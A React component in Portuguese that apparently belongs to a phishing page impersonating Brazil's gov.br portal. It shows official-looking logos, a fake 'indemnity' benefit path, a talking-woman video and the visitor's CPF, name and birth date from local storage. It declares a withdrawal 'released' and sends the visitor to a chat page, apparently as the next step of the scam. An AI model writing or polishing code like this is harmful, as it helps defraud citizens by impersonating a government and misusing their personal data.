import React, { useEffect, useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import styles from './Consulta.module.scss';

const Consulta = () => {
  const [nomeCompleto, setNomeCompleto] = useState('');
  const [nomeDaMae, setNomeDaMae] = useState('');
  const [dataDeNascimento, setDataDeNascimento] = useState('');
  const [cpf, setCpf] = useState('');
  const [muted, setMuted] = useState(true);
  const videoRef = useRef(null);
  const navigate = useNavigate();


  useEffect(() => {
    setNomeCompleto(localStorage.getItem('nomeCompleto') || '');
    setNomeDaMae(localStorage.getItem('nomeDaMae') || '');
    setDataDeNascimento(localStorage.getItem('dataDeNascimento') || '');
    setCpf(localStorage.getItem('cpf') || '');
  }, []);

  // Atualiza o muted do vídeo quando o estado muda
  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.muted = muted;
    }
  }, [muted]);

  const toggleSound = () => {
    setMuted(prev => !prev);
  };

  const handleClick = () => {
    navigate('/chat');  // redireciona para /login usando react-router-dom
  };

  return (
    <div className={styles.consulta}>
      {/* Navbar */}
      <div className={styles.navbar}>
        <div>
          <img src="/govbr.png" alt="Logo GovBR" />
        </div>
        <div>
          <i className="bi bi-three-dots-vertical"></i>
          <i className="bi bi-circle-half"></i>
          <i className="bi bi-grid-3x3-gap-fill"></i>
          <span className={styles.entrarBtn}>
            {nomeCompleto ? nomeCompleto.split(' ')[0] : ''}
          </span>
        </div>
      </div>

      {/* Caminho */}
      <div className={styles.path}>
        <i className="bi bi-list"></i>
        <span>
          Benefício &gt; Indenização &gt; <b>Acessar</b>
        </span>
      </div>

      <div className={styles.video} style={{ position: 'relative', width: '100%', maxWidth: '600px', margin: '20px auto' }}>
        <video
          ref={videoRef}
          src="/mulher_falando.mp4"
          autoPlay
          muted={muted}
          style={{ width: '80%', display: 'block' }}
          playsInline
        />
        {/* Botão para ativar/desativar som */}
        <button
          onClick={toggleSound}
          style={{
            position: 'absolute',
            top: '50%',
            left: '50%',
            transform: 'translate(-50%, -50%)',
            backgroundColor: 'rgba(0,0,0,0.6)',
            border: 'none',
            borderRadius: '50%',
            width: '50px',
            height: '50px',
            color: '#fff',
            cursor: 'pointer',
            fontSize: '20px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
          }}
          aria-label={muted ? 'Ativar som' : 'Desativar som'}
        >
          {muted ? '🔇' : '🔊'}
        </button>
      </div>

      {/* Mostrando os dados carregados */}
      <div className={styles.dados}>
        <div className={styles.dadosUsuario}>
          <div>
            <div className={styles.itemUser}>
              <i class="bi bi-credit-card-2-front-fill"></i>
              <span>{cpf}</span>
            </div>
            <div className={styles.itemUser}>
              <i class="bi bi-person-fill"></i>
              <span>{nomeCompleto}</span>
            </div>
            <div className={styles.itemUser}>
              <i class="bi bi-calendar-fill"></i>
              <span>{dataDeNascimento}</span>
            </div>
            <div className={styles.itemUser}>
              <i class="bi bi-check-all" style={{color: 'green'}}></i>
              <span>Saque liberado</span>
            </div>

          </div>
        </div>
        <span className={styles.saqueBtn} onClick={handleClick}>Efetuar saque</span>
      </div>
      <div className={styles.footer}>
              <img src="/govwhite.png" alt="Logo Branco" />
              <span>Todo o conteúdo deste site está publicado sob a licença</span>
              <span>Creative Commons Atribuição - Sem Derivações 3.0 Não Adaptada</span>
            </div>
    </div>
  );
};

export default Consulta;
